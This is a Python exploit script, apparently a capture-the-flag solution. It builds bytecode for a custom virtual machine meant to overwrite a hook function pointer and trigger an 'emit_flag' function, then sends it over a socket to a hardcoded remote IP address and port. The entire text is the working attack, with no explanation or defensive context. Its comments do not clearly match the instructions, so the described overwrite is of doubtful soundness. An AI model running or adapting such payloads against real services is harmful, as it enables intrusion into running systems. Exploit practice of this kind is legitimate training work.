import socket
import struct
import time

def ins(op, a=0, b=0, imm=0):
    return bytes([op, a, b, 0]) + struct.pack("<i", imm)

# Build exploit program that overwrites the hook function pointer
prog = b"".join([
    # Load immediate value 0x100 into register 1 (this is where our hook pointer is stored)
    ins(0x14, 1, 0, 0x100),
    
    # Store register 1 to memory address 0x1e0 (this will be our target for overwrite)
    ins(0x0d, 1, 0, 0x1e0),
    
    # Load the value from memory address 0x100 into register 0
    ins(0x15, 0, 1, 0x100),
    
    # Call function in register 0 (this will call emit_flag after our overwrite)
    ins(0x16, 0, 0, 0),
])

# Pack the program length and bytecode
payload = struct.pack("<I", len(prog)) + prog

# Connect to the service and send our exploit
s = socket.create_connection(("52.76.96.108", 9006), timeout=10)
print(s.recv(4096).decode(errors="replace"))
s.sendall(payload)
time.sleep(0.5)
print(s.recv(4096).decode(errors="replace"))